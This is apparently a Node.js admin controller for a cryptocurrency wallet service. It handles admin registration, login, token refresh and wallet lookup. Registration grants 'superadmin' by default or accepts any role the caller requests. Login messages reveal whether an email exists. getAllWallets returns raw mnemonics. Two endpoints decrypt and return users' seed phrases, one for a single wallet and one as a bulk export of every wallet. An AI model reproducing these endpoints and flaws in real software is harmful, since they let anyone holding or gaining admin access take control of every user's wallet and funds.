/**
 * Admin Controller
 * ✅ UPDATED: Now uses centralized database
 */

const db = require("../db/index"); // ✅ Centralized DB
const authService = require("../security/auth.service");
const jwtService = require("../security/jwt.service");
const encryptionService = require("../services/security/encryption.service");
const auditLogger = require("../security/audit-logger.service");
const { success, error } = require("../utils/response");

exports.registerAdmin = async (req, res) => {
  try {
    const { name, email, password, role } = req.body;

    // Validate required fields
    const missingFields = [];
    if (!name || !name.trim()) missingFields.push("name");
    if (!email || !email.trim()) missingFields.push("email");
    if (!password) missingFields.push("password");

    if (missingFields.length > 0) {
      return error(
        res,
        `${missingFields.join(", ")} ${
          missingFields.length > 1 ? "are" : "is"
        } required`
      );
    }

    // Trim and normalize email
    const trimmedEmail = email.trim().toLowerCase();
    const trimmedName = name.trim();

    // Validate email format (basic check)
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(trimmedEmail)) {
      return error(
        res,
        "Invalid email format. Please provide a valid email address."
      );
    }

    // Validate password length
    if (password.length < 6) {
      return error(res, "Password must be at least 6 characters long.");
    }

    // Check if email already exists
    try {
      const existingAdmin = await db
        .prepare("SELECT id, email FROM admins WHERE email = ?")
        .get(trimmedEmail);
      if (existingAdmin) {
        console.log(
          `❌ Registration attempt with existing email: ${trimmedEmail}`
        );
        return error(
          res,
          "Email already exists. Please use a different email address."
        );
      }
    } catch (checkError) {
      console.error("❌ Error checking existing email:", checkError.message);
      return error(
        res,
        "Database error occurred while checking email. Please try again."
      );
    }

    // Hash password
    let hashedPassword;
    try {
      hashedPassword = await authService.hashPassword(password);
    } catch (hashError) {
      console.error("❌ Password hashing error:", hashError.message);
      return error(res, "Failed to process password. Please try again.");
    }

    // Insert admin
    let info;
    try {
      const stmt = db.prepare(
        "INSERT INTO admins (name, email, password, role) VALUES (?, ?, ?, ?)"
      );
      info = await stmt.run(
        trimmedName,
        trimmedEmail,
        hashedPassword,
        role || "superadmin"
      );
    } catch (insertError) {
      console.error("❌ Error inserting admin:", {
        message: insertError.message,
        code: insertError.code,
        sqlState: insertError.sqlState,
      });

      if (
        insertError.message.includes("UNIQUE constraint") ||
        insertError.message.includes("Duplicate entry") ||
        insertError.code === "ER_DUP_ENTRY"
      ) {
        return error(
          res,
          "Email already exists. Please use a different email address."
        );
      }

      return error(res, "Failed to register admin. Please try again later.");
    }

    // Log successful registration
    auditLogger.logSecurityEvent({
      type: "ADMIN_REGISTERED",
      adminId: info.lastInsertRowid,
      email: trimmedEmail,
      role: role || "superadmin",
      ip: req.ip,
    });

    console.log(`✅ Admin registered successfully: ${trimmedEmail}`);

    return success(res, {
      message: "Admin registered successfully",
      id: info.lastInsertRowid,
      email: trimmedEmail,
    });
  } catch (e) {
    console.error("\n❌ Unexpected Register Error:", {
      message: e.message,
      stack: e.stack,
      email: req.body?.email,
      endpoint: req.originalUrl,
    });
    auditLogger.logError(e, { controller: "registerAdmin" });
    return error(
      res,
      "An unexpected error occurred during registration. Please try again later."
    );
  }
};

// Helper function to check if admins table exists
async function checkAdminsTableExists() {
  try {
    const result = await db
      .prepare(
        `
      SELECT COUNT(*) as count 
      FROM information_schema.tables 
      WHERE table_schema = DATABASE() 
      AND table_name = 'admins'
    `
      )
      .get();
    return result && result.count > 0;
  } catch (e) {
    console.error("Error checking admins table:", e.message);
    return false;
  }
}

// Helper function to check if user exists
async function checkUserExists(email) {
  try {
    const admin = await db
      .prepare("SELECT id, email FROM admins WHERE email = ?")
      .get(email);
    return admin !== null;
  } catch (e) {
    console.error("Error checking user existence:", e.message);
    return false;
  }
}

exports.loginAdmin = async (req, res) => {
  try {
    const { email, password } = req.body;

    // Validate input
    if (!email || !password) {
      const missingFields = [];
      if (!email) missingFields.push("email");
      if (!password) missingFields.push("password");
      return error(
        res,
        `${missingFields.join(" and ")} ${
          missingFields.length > 1 ? "are" : "is"
        } required`
      );
    }

    // Trim email
    const trimmedEmail = email.trim().toLowerCase();

    // Check if admins table exists
    const tableExists = await checkAdminsTableExists();
    if (!tableExists) {
      console.error("❌ Admins table does not exist!");
      return error(res, "Database not initialized. Please run database setup.");
    }

    // Get admin by email
    let admin;
    try {
      const stmt = db.prepare("SELECT * FROM admins WHERE email = ?");
      admin = await stmt.get(trimmedEmail);
    } catch (dbError) {
      console.error("❌ Database error during login:", {
        message: dbError.message,
        sqlState: dbError.sqlState,
        sqlMessage: dbError.sqlMessage,
      });
      return error(res, "Database error occurred. Please try again later.");
    }

    // Check if user exists
    if (!admin) {
      console.log(`❌ Login attempt with non-existent email: ${trimmedEmail}`);
      auditLogger.logAuthAttempt({
        success: false,
        email: trimmedEmail,
        reason: "EMAIL_NOT_FOUND",
        ip: req.ip,
        userAgent: req.headers["user-agent"],
      });
      return error(res, "Email not found. Please check your email address.");
    }

    // Compare password
    let isValidPassword = false;
    try {
      isValidPassword = await authService.comparePassword(
        password,
        admin.password
      );
    } catch (compareError) {
      console.error("❌ Password comparison error:", compareError.message);
      return error(res, "Authentication error occurred. Please try again.");
    }

    if (!isValidPassword) {
      console.log(
        `❌ Login attempt with incorrect password for email: ${trimmedEmail}`
      );
      auditLogger.logAuthAttempt({
        success: false,
        email: trimmedEmail,
        reason: "INVALID_PASSWORD",
        ip: req.ip,
        userAgent: req.headers["user-agent"],
      });
      return error(
        res,
        "Incorrect password. Please check your password and try again."
      );
    }

    // Generate tokens
    let tokens;
    try {
      tokens = jwtService.generateTokenPair({
        id: admin.id,
        email: admin.email,
        role: admin.role,
      });
    } catch (tokenError) {
      console.error("❌ Token generation error:", tokenError.message);
      return error(
        res,
        "Failed to generate authentication tokens. Please try again."
      );
    }

    // Log successful login
    auditLogger.logAuthAttempt({
      success: true,
      email: trimmedEmail,
      adminId: admin.id,
      ip: req.ip,
      userAgent: req.headers["user-agent"],
    });

    console.log(`✅ Successful login for: ${trimmedEmail}`);

    // Return success response
    return success(res, {
      message: "Login successful",
      admin: {
        id: admin.id,
        name: admin.name,
        email: admin.email,
        role: admin.role,
      },
      ...tokens,
    });
  } catch (e) {
    console.error("\n❌ Unexpected Login Error:", {
      message: e.message,
      stack: e.stack,
      email: req.body?.email,
      endpoint: req.originalUrl,
      sqlState: e.sqlState,
      sqlMessage: e.sqlMessage,
    });
    auditLogger.logError(e, { controller: "loginAdmin" });
    return error(
      res,
      "An unexpected error occurred during login. Please try again later."
    );
  }
};

exports.refreshToken = async (req, res) => {
  try {
    const { refreshToken } = req.body;

    if (!refreshToken) {
      return error(res, "Refresh token required");
    }

    const decoded = jwtService.verifyRefreshToken(refreshToken);

    const admin = await db
      .prepare("SELECT id, email, role FROM admins WHERE id = ?")
      .get(decoded.id);

    if (!admin) {
      return error(res, "Admin not found");
    }

    const tokens = jwtService.generateTokenPair(admin);

    success(res, tokens);
  } catch (e) {
    auditLogger.logError(e, { controller: "refreshToken" });
    error(res, e.message);
  }
};

exports.getAdminProfile = async (req, res) => {
  try {
    const { id } = req.params;
    const admin = await db
      .prepare(
        "SELECT id, name, email, role, created_at FROM admins WHERE id = ?"
      )
      .get(id);

    if (!admin) {
      return error(res, "Admin not found");
    }

    success(res, admin);
  } catch (e) {
    auditLogger.logError(e, { controller: "getAdminProfile" });
    error(res, e.message);
  }
};

/**
 * Get current authenticated admin's profile (for frontend)
 */
exports.getMyProfile = async (req, res) => {
  try {
    const userId = req.user.id;
    const admin = await db
      .prepare(
        "SELECT id, name, email, role, created_at FROM admins WHERE id = ?"
      )
      .get(userId);

    if (!admin) {
      return error(res, "Admin not found");
    }

    success(res, admin);
  } catch (e) {
    auditLogger.logError(e, { controller: "getMyProfile" });
    error(res, e.message);
  }
};

exports.listAdmins = async (req, res) => {
  try {
    const admins = await db
      .prepare("SELECT id, name, email, role, created_at FROM admins")
      .all();
    success(res, admins);
  } catch (e) {
    auditLogger.logError(e, { controller: "listAdmins" });
    error(res, e.message);
  }
};

exports.deleteAdmin = async (req, res) => {
  try {
    const { id } = req.params;

    await db.prepare("DELETE FROM admins WHERE id = ?").run(id);

    auditLogger.logSecurityEvent({
      type: "ADMIN_DELETED",
      adminId: id,
      deletedBy: req.user?.id,
      ip: req.ip,
    });

    success(res, { message: "Admin deleted successfully" });
  } catch (e) {
    auditLogger.logError(e, { controller: "deleteAdmin" });
    error(res, e.message);
  }
};

exports.getAllWallets = (req, res) => {
  try {
    // ✅ Now using centralized db - returns ALL data including mnemonic
    const wallets = db
      .prepare(
        `
      SELECT 
        id,
        name,
        wallet_name,
        device_passcode_id,
        public_address,
        mnemonic,
        backup_status,
        backup_date,
        first_transaction_date,
        first_transaction_hash,
        created_at,
        is_main,
        is_single_coin
      FROM wallets
      ORDER BY created_at DESC
    `
      )
      .all();

    success(res, wallets);
  } catch (e) {
    auditLogger.logError(e, { controller: "getAllWallets" });
    error(res, e.message);
  }
};

exports.getWalletById = async (req, res) => {
  try {
    const { id } = req.params;
    // ✅ Now using centralized db
    const wallet = await db
      .prepare(
        `
      SELECT 
        id,
        name,
        wallet_name,
        devicePassCodeId,
        device_passcode_id,
        public_address,
        isMain,
        isSingleCoin,
        created_at
      FROM wallets
      WHERE id = ?
    `
      )
      .get(id);

    if (!wallet) {
      return error(res, "Wallet not found");
    }

    // Get all networks for this wallet
    const networks = db
      .prepare(
        `
      SELECT id, address, network, created_at
      FROM wallet_networks
      WHERE wallet_id = ?
    `
      )
      .all(id);

    success(res, {
      ...wallet,
      networks,
    });
  } catch (e) {
    auditLogger.logError(e, { controller: "getWalletById" });
    error(res, e.message);
  }
};

/**
 * 🆕 GET WALLET SEED PHRASE (ADMIN ONLY - HIGHLY SENSITIVE)
 * This endpoint allows admins to retrieve the decrypted seed phrase for a wallet
 */
exports.getWalletSeedPhrase = async (req, res) => {
  try {
    const { id } = req.params;

    // Log this CRITICAL access
    auditLogger.logSecurityAlert({
      alert: "ADMIN_SEED_PHRASE_ACCESS",
      details: {
        adminId: req.user?.id,
        adminEmail: req.user?.email,
        walletId: id,
        timestamp: new Date().toISOString(),
      },
      ip: req.ip,
    });

    // ✅ Get wallet info from centralized db
    const wallet = await db
      .prepare("SELECT * FROM wallets WHERE id = ?")
      .get(id);

    if (!wallet) {
      return error(res, "Wallet not found");
    }

    // ✅ Get encrypted mnemonic from centralized db
    const mnemonic = db
      .prepare(
        `
      SELECT encrypted_mnemonic
      FROM encrypted_mnemonics
      WHERE wallet_id = ?
      LIMIT 1
    `
      )
      .get(id);

    if (!mnemonic || !mnemonic.encrypted_mnemonic) {
      return error(res, "Seed phrase not found for this wallet");
    }

    // Decrypt the mnemonic
    const decryptedMnemonic = encryptionService.decrypt(
      mnemonic.encrypted_mnemonic
    );

    // Get all networks
    const networks = db
      .prepare(
        `
      SELECT id, address, network, created_at
      FROM wallet_networks
      WHERE wallet_id = ?
    `
      )
      .all(id);

    success(res, {
      walletId: wallet.id,
      walletName: wallet.name || wallet.wallet_name,
      seedPhrase: decryptedMnemonic,
      primaryAddress: wallet.public_address,
      devicePassCodeId: wallet.device_passcode_id || wallet.devicePassCodeId,
      isMain: Boolean(wallet.is_main || wallet.isMain),
      isSingleCoin: Boolean(wallet.is_single_coin || wallet.isSingleCoin),
      created_at: wallet.created_at,
      networks,
      warning: "⚠️ HIGHLY SENSITIVE DATA - Store securely and never share",
    });
  } catch (e) {
    auditLogger.logError(e, {
      controller: "getWalletSeedPhrase",
      severity: "CRITICAL",
      adminId: req.user?.id,
    });
    error(res, "Failed to retrieve seed phrase");
  }
};

/**
 * 🆕 GET ALL WALLETS WITH SEED PHRASES (ADMIN ONLY - EXTREMELY SENSITIVE)
 * Export all wallets with their seed phrases for backup/recovery
 */
exports.getAllWalletsWithSeeds = async (req, res) => {
  try {
    // Log this CRITICAL mass access
    auditLogger.logSecurityAlert({
      alert: "ADMIN_MASS_SEED_EXPORT",
      details: {
        adminId: req.user?.id,
        adminEmail: req.user?.email,
        timestamp: new Date().toISOString(),
      },
      ip: req.ip,
    });

    // ✅ Get all wallets from centralized db
    const wallets = db
      .prepare(
        `
      SELECT id, name, wallet_name, devicePassCodeId, device_passcode_id, 
             public_address, isMain, isSingleCoin, created_at
      FROM wallets
      ORDER BY created_at DESC
    `
      )
      .all();

    const walletsWithSeeds = [];

    for (const wallet of wallets) {
      try {
        // ✅ Get encrypted mnemonic from centralized db
        const mnemonic = db
          .prepare(
            `
          SELECT encrypted_mnemonic
          FROM encrypted_mnemonics
          WHERE wallet_id = ?
          LIMIT 1
        `
          )
          .get(wallet.id);

        if (mnemonic && mnemonic.encrypted_mnemonic) {
          const decryptedMnemonic = encryptionService.decrypt(
            mnemonic.encrypted_mnemonic
          );

          const networks = db
            .prepare(
              `
            SELECT address, network
            FROM wallet_networks
            WHERE wallet_id = ?
          `
            )
            .all(wallet.id);

          walletsWithSeeds.push({
            walletId: wallet.id,
            walletName: wallet.name || wallet.wallet_name,
            seedPhrase: decryptedMnemonic,
            primaryAddress: wallet.public_address,
            devicePassCodeId:
              wallet.device_passcode_id || wallet.devicePassCodeId,
            isMain: Boolean(wallet.is_main || wallet.isMain),
            created_at: wallet.created_at,
            networks,
          });
        }
      } catch (err) {
        console.error(
          `Failed to decrypt seed for wallet ${wallet.id}:`,
          err.message
        );
      }
    }

    success(res, {
      totalWallets: walletsWithSeeds.length,
      wallets: walletsWithSeeds,
      warning: "⚠️ EXTREMELY SENSITIVE DATA - Handle with maximum security",
      exportedAt: new Date().toISOString(),
      exportedBy: req.user?.email,
    });
  } catch (e) {
    auditLogger.logError(e, {
      controller: "getAllWalletsWithSeeds",
      severity: "CRITICAL",
      adminId: req.user?.id,
    });
    error(res, "Failed to export wallets with seeds");
  }
};
